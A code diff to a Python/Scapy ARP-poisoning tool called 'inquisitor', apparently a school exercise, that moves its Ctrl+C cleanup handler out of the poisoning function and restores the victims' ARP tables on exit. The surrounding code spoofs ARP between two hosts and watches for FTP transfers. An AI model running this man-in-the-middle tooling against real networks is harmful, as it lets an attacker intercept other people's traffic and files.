@@ -22,7 +22,7 @@ def restore_arp_tables(src_ip, src_mac, target_ip, target_mac, interface='eth0')
     sendp(Ether(dst=target_mac, src=src_mac) / arp_restore_src, iface=interface, verbose=False)
     sendp(Ether(dst=src_mac, src=target_mac) / arp_restore_target, iface=interface, verbose=False)
     
-    print("\nOriginal ARP tables restored.")
+    print("Original ARP tables restored.")
 
 
 def arp_poison(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
@@ -49,23 +49,15 @@ def arp_poison(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
         else:
             print("No ARP packet to poison or no FTP file transfer detected")
 
-    global sniff_thread
-    sniff_thread = None
-
-    def cleanup(signum, frame):
-        if sniff_thread is not None:
-            try:
-                sniff_thread.cancel()
-            except Exception as e:
-                print(f"Error cancelling sniff thread: {e}")
-        restore_arp_tables(src_ip, src_mac, target_ip, target_mac)
-        print("ARP Poisoning stopped.")
-        sys.exit(0)
-
-    signal.signal(signal.SIGINT, cleanup)
     print(f"ARP Poisoning started. Press CTRL+C to stop.")
-    sniff_thread = sniff(iface=interface, filter="", prn=lambda x: poison_packet(x), store=0)
+    sniff(iface=interface, prn=lambda x: poison_packet(x), store=0)
 
+def cleanup(signum, frame):
+    print("\nStopping ARP poisoning and restoring network...")
+    src_ip, src_mac, target_ip, target_mac = args.addresses
+    restore_arp_tables(src_ip, src_mac, target_ip, target_mac)
+    print("ARP Poisoning stopped.")
+    sys.exit(0)
 
 def ft_parser_args():
     parser = argparse.ArgumentParser(description='ARP poisoning,./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
@@ -74,6 +66,7 @@ def ft_parser_args():
 
 
 def main():
+    global args
     args = ft_parser_args()
     try:
         ip_src, mac_src, ip_target, mac_target = args.addresses
@@ -84,6 +77,7 @@ def main():
             print("Invalid MAC address format")
             exit(1)
         print("Valid IP addresses entered.")
+        signal.signal(signal.SIGINT, cleanup)
         arp_poison(ip_src, mac_src, ip_target, mac_target)
         print("ARP Poisoning completed successfully.")
     except ValueError:
